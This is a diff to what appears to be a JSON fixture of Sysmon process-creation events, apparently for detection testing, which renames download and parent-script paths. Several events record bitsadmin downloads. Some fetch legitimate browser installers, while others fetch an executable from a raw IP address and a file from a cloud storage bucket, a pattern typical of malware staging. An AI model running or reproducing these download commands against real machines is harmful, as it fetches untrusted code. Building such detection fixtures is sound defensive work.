@@ -361,11 +361,11 @@
           "process": {
             "pid": 9260,
             "image": "C:\\Windows\\System32\\bitsadmin.exe",
-            "command_line": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe",
+            "command_line": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe",
             "parent": {
               "pid": null,
               "image": "C:\\Windows\\System32\\cmd.exe",
-              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
               "parent": null
             }
           },
@@ -375,7 +375,7 @@
             "Keywords": "0x8000000000000000",
             "Task": "1",
             "Description": "BITS administration utility",
-            "CommandLine": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe",
+            "CommandLine": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe",
             "TimeCreated": "2026-11-20T02:36:43.547Z",
             "Product": "Microsoft® Windows® Operating System",
             "Company": "Microsoft Corporation",
@@ -388,7 +388,7 @@
             "CurrentDirectory": "C:\\Users\\wardog\\",
             "Hashes": "SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9",
             "UtcTime": "2026-11-20 06:36:43.542",
-            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "TerminalSessionId": "2",
             "ProcessId": "9260",
             "ParentImage": "C:\\Windows\\System32\\cmd.exe",
@@ -403,7 +403,7 @@
             "EventID": 1,
             "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
             "RuleName": "-",
-            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer AppUpdate /download /priority normal \"https://dl.google.com/chrome/install/ChromeStandaloneSetup64.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "Channel": "Microsoft-Windows-Sysmon/Operational"
           },
           "untrusted_fields": [
@@ -1149,11 +1149,11 @@
           "process": {
             "pid": 9260,
             "image": "C:\\Windows\\System32\\bitsadmin.exe",
-            "command_line": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat",
+            "command_line": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\Deploy\\cache\\pkg.dat",
             "parent": {
               "pid": null,
               "image": "C:\\Windows\\System32\\cmd.exe",
-              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
               "parent": null
             }
           },
@@ -1163,7 +1163,7 @@
             "Keywords": "0x8000000000000000",
             "Task": "1",
             "Description": "BITS administration utility",
-            "CommandLine": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat",
+            "CommandLine": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\Deploy\\cache\\pkg.dat",
             "TimeCreated": "2026-11-20T02:36:43.547Z",
             "Product": "Microsoft® Windows® Operating System",
             "Company": "Microsoft Corporation",
@@ -1176,7 +1176,7 @@
             "CurrentDirectory": "C:\\Users\\wardog\\",
             "Hashes": "SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9",
             "UtcTime": "2026-11-20 06:36:43.542",
-            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "TerminalSessionId": "2",
             "ProcessId": "9260",
             "ParentImage": "C:\\Windows\\System32\\cmd.exe",
@@ -1191,7 +1191,7 @@
             "EventID": 1,
             "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
             "RuleName": "-",
-            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer PkgSync /download /priority normal \"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\" C:\\ProgramData\\Deploy\\cache\\pkg.dat\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "Channel": "Microsoft-Windows-Sysmon/Operational"
           },
           "untrusted_fields": [
@@ -1608,11 +1608,11 @@
           "process": {
             "pid": 9260,
             "image": "C:\\Windows\\System32\\bitsadmin.exe",
-            "command_line": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe",
+            "command_line": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe",
             "parent": {
               "pid": null,
               "image": "C:\\Windows\\System32\\cmd.exe",
-              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
               "parent": null
             }
           },
@@ -1622,7 +1622,7 @@
             "Keywords": "0x8000000000000000",
             "Task": "1",
             "Description": "BITS administration utility",
-            "CommandLine": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe",
+            "CommandLine": "bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe",
             "TimeCreated": "2026-11-20T02:36:43.547Z",
             "Product": "Microsoft® Windows® Operating System",
             "Company": "Microsoft Corporation",
@@ -1635,7 +1635,7 @@
             "CurrentDirectory": "C:\\Users\\wardog\\",
             "Hashes": "SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9",
             "UtcTime": "2026-11-20 06:36:43.542",
-            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "TerminalSessionId": "2",
             "ProcessId": "9260",
             "ParentImage": "C:\\Windows\\System32\\cmd.exe",
@@ -1650,7 +1650,7 @@
             "EventID": 1,
             "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
             "RuleName": "-",
-            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\AppUpdate\\Packages\\setup.exe\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer AppUpdate /download /priority normal \"http://82.165.181.96:443/d/wuauclt.exe\" C:\\ProgramData\\Deploy\\cache\\setup.exe\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "Channel": "Microsoft-Windows-Sysmon/Operational"
           },
           "untrusted_fields": [
@@ -2010,11 +2010,11 @@
           "process": {
             "pid": 9260,
             "image": "C:\\Windows\\System32\\bitsadmin.exe",
-            "command_line": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat",
+            "command_line": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\Deploy\\cache\\pkg.dat",
             "parent": {
               "pid": null,
               "image": "C:\\Windows\\System32\\cmd.exe",
-              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+              "command_line": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
               "parent": null
             }
           },
@@ -2024,7 +2024,7 @@
             "Keywords": "0x8000000000000000",
             "Task": "1",
             "Description": "BITS administration utility",
-            "CommandLine": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat",
+            "CommandLine": "bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\Deploy\\cache\\pkg.dat",
             "TimeCreated": "2026-11-20T02:36:43.547Z",
             "Product": "Microsoft® Windows® Operating System",
             "Company": "Microsoft Corporation",
@@ -2037,7 +2037,7 @@
             "CurrentDirectory": "C:\\Users\\wardog\\",
             "Hashes": "SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9",
             "UtcTime": "2026-11-20 06:36:43.542",
-            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "TerminalSessionId": "2",
             "ProcessId": "9260",
             "ParentImage": "C:\\Windows\\System32\\cmd.exe",
@@ -2052,7 +2052,7 @@
             "EventID": 1,
             "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
             "RuleName": "-",
-            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\AppUpdate\\Packages\\pkg.dat\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\ProgramData\\AppUpdate\\update.cmd",
+            "Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-11-20 06:36:43.542\r\nProcessGuid: {39e4a257-79fb-5f92-7117-000000000700}\r\nProcessId: 9260\r\nImage: C:\\Windows\\System32\\bitsadmin.exe\r\nFileVersion: 7.8.18362.1 (WinBuild.160101.0800)\r\nDescription: BITS administration utility\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: bitsadmin.exe\r\nCommandLine: bitsadmin.exe /transfer PkgSync /download /priority normal \"https://3byy0j.oss-cn-beijing.aliyuncs.com/s.dat\" C:\\ProgramData\\Deploy\\cache\\pkg.dat\r\nCurrentDirectory: C:\\Users\\wardog\\\r\nUser: WORKSTATION5\\wardog\r\nLogonGuid: {39e4a257-f1ac-5f8b-d961-0c0000000000}\r\nLogonId: 0xC61D9\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=282DA9EE622F01CC63352E53FDC3D4A75CEEB6FD,MD5=A23A7A6B6F8E1A5D913EA119F5F2ED1A,SHA256=EAAE8536D554D0E86D8540A8B34DB2649BD884843F389495D0B6E91636C6CF54,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9\r\nParentProcessGuid: {39e4a257-79ed-5f92-6e17-000000000700}\r\nParentProcessId: 10044\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c C:\\Scripts\\Deploy\\Update-Packages.cmd",
             "Channel": "Microsoft-Windows-Sysmon/Operational"
           },
           "untrusted_fields": [
